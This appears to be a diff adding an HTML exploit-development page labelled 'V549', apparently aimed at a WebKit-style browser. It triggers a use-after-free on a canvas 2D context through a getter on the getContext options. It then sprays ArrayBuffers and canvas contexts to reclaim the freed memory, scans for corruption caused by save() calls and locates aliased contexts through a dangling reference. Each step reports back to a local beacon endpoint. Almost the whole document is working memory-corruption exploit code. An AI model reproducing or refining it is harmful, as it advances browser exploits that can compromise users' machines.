@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V549</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V549-'+tag+'?d='+encodeURIComponent(data)+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+b('BOOT','V549-save-nogc');
+
+// T1: Same-type reclaim control
+(function T1(){
+  b('T1-START','control');
+  var ctx=triggerUAF();
+  var ctxs=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    ctxs.push(c.getContext('2d'));
+  }
+  b('T1-LW','val='+ctx.lineWidth);
+})();
+
+// T2: AB spray → IMMEDIATE save() → scan (ZERO allocations between spray and save)
+// The GC crash in V547 was from snapshot allocations triggering GC.
+// Here: spray ABs, then call save() with NOTHING in between.
+// Then scan ABs for the changed byte (m_unrealizedSaveCount).
+(function T2(){
+  b('T2-START','AB spray + immediate save');
+  var ctx=triggerUAF();
+
+  // Spray just 50 ABs to minimize GC risk
+  // bmalloc LIFO: first AB(768) after free should reclaim the slot
+  var abs=[];
+  var views=[];
+  for(var i=0;i<50;i++){
+    var ab=new ArrayBuffer(768);
+    abs.push(ab);
+    views.push(new Uint8Array(ab));
+  }
+
+  // NO beacons, NO allocations here — go straight to save()
+  ctx.save();
+  // save() just did ++m_unrealizedSaveCount on whichever AB reclaimed the slot
+
+  // Now scan: find which AB has a non-zero byte
+  // m_unrealizedSaveCount is an unsigned int, value should now be 1
+  // Check ALL bytes of each AB
+  var hitAB=-1;
+  var hitOff=-1;
+  var hitVal=0;
+  for(var i=0;i<50;i++){
+    for(var j=0;j<768;j++){
+      if(views[i][j]!==0){
+        hitAB=i;
+        hitOff=j;
+        hitVal=views[i][j];
+        break;
+      }
+    }
+    if(hitAB>=0)break;
+  }
+
+  b('T2-SPRAY','50 ABs');
+  if(hitAB>=0){
+    b('T2-HIT','AB['+hitAB+'] off='+hitOff+' val='+hitVal);
+    // Dump surrounding bytes
+    var dump=[];
+    for(var j=Math.max(0,hitOff-8);j<Math.min(768,hitOff+16);j++){
+      dump.push(j+':'+views[hitAB][j]);
+    }
+    b('T2-DUMP',dump.join(','));
+  }else{
+    b('T2-MISS','no non-zero bytes found (save may not have hit any AB)');
+  }
+})();
+
+// T3: Same but with 5 saves to amplify
+(function T3(){
+  b('T3-START','AB spray + 5x save');
+  var ctx=triggerUAF();
+
+  var abs=[];
+  var views=[];
+  for(var i=0;i<50;i++){
+    var ab=new ArrayBuffer(768);
+    abs.push(ab);
+    views.push(new Uint8Array(ab));
+  }
+
+  // 5 saves — no allocations
+  ctx.save();
+  ctx.save();
+  ctx.save();
+  ctx.save();
+  ctx.save();
+
+  var hitAB=-1;
+  var hitOff=-1;
+  var hitVal=0;
+  for(var i=0;i<50;i++){
+    for(var j=0;j<768;j++){
+      if(views[i][j]!==0){
+        hitAB=i;
+        hitOff=j;
+        hitVal=views[i][j];
+        break;
+      }
+    }
+    if(hitAB>=0)break;
+  }
+
+  b('T3-SPRAY','50 ABs');
+  if(hitAB>=0){
+    b('T3-HIT','AB['+hitAB+'] off='+hitOff+' val='+hitVal);
+    var dump=[];
+    for(var j=Math.max(0,hitOff-8);j<Math.min(768,hitOff+16);j++){
+      dump.push(j+':'+views[hitAB][j]);
+    }
+    b('T3-DUMP',dump.join(','));
+  }else{
+    b('T3-MISS','no non-zero bytes (5x save didn\'t hit any AB)');
+  }
+})();
+
+// T4: Single AB only — highest probability of reclaim
+// bmalloc LIFO means the very first 768B alloc gets the freed slot
+(function T4(){
+  b('T4-START','single AB + save');
+  var ctx=triggerUAF();
+
+  var ab=new ArrayBuffer(768);
+  var view=new Uint8Array(ab);
+
+  // save 10 times
+  ctx.save();ctx.save();ctx.save();ctx.save();ctx.save();
+  ctx.save();ctx.save();ctx.save();ctx.save();ctx.save();
+
+  // Check all bytes
+  var hits=[];
+  for(var j=0;j<768;j++){
+    if(view[j]!==0)hits.push(j+':'+view[j]);
+  }
+  if(hits.length>0){
+    b('T4-HIT','single AB: '+hits.join(','));
+  }else{
+    b('T4-MISS','single AB all zeros after 10x save');
+  }
+})();
+
+// T5: canvas.width reset — does it free the context?
+// Same-type reclaim → identify alias → canvas.width reset → read lineWidth
+(function T5(){
+  b('T5-START','canvas.width reset test');
+  var ctx=triggerUAF();
+
+  var ctxs=[];
+  var canvases=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    canvases.push(c);
+    ctxs.push(c.getContext('2d'));
+    ctxs[i].lineWidth=i+1;
+  }
+
+  ctx.lineWidth=11111.11;
+  var aliasIdx=-1;
+  for(var i=0;i<ctxs.length;i++){
+    if(ctxs[i].lineWidth===11111.11){aliasIdx=i;break}
+  }
+  if(aliasIdx<0){b('T5-NOALIAS','not found');return}
+  b('T5-ALIAS','idx='+aliasIdx);
+
+  // Reset the aliased canvas via width assignment
+  canvases[aliasIdx].width=canvases[aliasIdx].width;
+  b('T5-RESET','canvas.width reset done');
+
+  // Try reading lineWidth through dangling ref
+  try{
+    var lw=ctx.lineWidth;
+    b('T5-LW','val='+lw+' (1=reset, 11111.11=not freed)');
+  }catch(e){b('T5-LW-ERR',e.message)}
+})();
+
+b('DONE','V549-all-complete');
+</script>
+</body></html>
